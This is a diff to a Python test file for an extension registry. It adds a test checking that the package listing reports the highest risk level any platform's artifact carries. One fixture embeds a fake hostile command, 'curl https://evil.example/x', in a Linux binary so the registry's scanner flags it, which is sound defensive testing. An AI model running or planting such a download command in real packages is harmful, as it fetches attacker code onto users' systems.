@@ -245,6 +245,23 @@ def test_the_listing_carries_the_latest_versions_disclosure_and_scan(signed_env:
     assert "disclosure_envelope" not in item and "disclosure_signature" not in item
 
 
+def test_the_listing_carries_each_targets_risk_level(signed_env: SignedEnv) -> None:
+    # D-f: the list card shows the highest level any platform's artifact has,
+    # so it never reads lower than what some platform installs.
+    manifest = _backend_manifest()
+    plain = build_v2_package(manifest, backend_data=MACHO_ARM64)
+    curl = build_v2_package(manifest, backend_data=ELF_X64 + b"\0curl https://evil.example/x\0")
+    assert _publish_signed(signed_env, plain, target="darwin-arm64").status_code == 201
+    assert _publish_signed(signed_env, curl, target="linux-x64").status_code == 201
+    versions = signed_env.client.get("/api/extensions/acme/indexer").json()["versions"]
+    expected = {
+        row["target"]: disclosure_scan_contract.card_risk_level(row["disclosure"], row["scan"]) for row in versions
+    }
+    assert len(set(expected.values())) == 2
+    [item] = signed_env.client.get("/api/extensions").json()["items"]
+    assert item["risk_by_target"] == expected
+
+
 def test_a_legacy_v1_package_has_no_disclosure(signed_env: SignedEnv) -> None:
     assert _publish_signed(signed_env, build_package()).status_code == 201
     version = signed_env.client.get("/api/extensions/acme/hello").json()["versions"][0]
@@ -272,6 +289,7 @@ def test_a_version_published_before_disclosure_still_lists_with_null_fields(
     listing = signed_env.client.get("/api/extensions").json()
     assert [item["identity"] for item in listing["items"]] == ["acme.scoped"]
     assert listing["items"][0]["disclosure"] is None
+    assert listing["items"][0]["risk_by_target"] is None
     version = signed_env.client.get("/api/extensions/acme/scoped").json()["versions"][0]
     assert version["registry_envelope"] == envelope
     assert version["registry_signature"] == signature
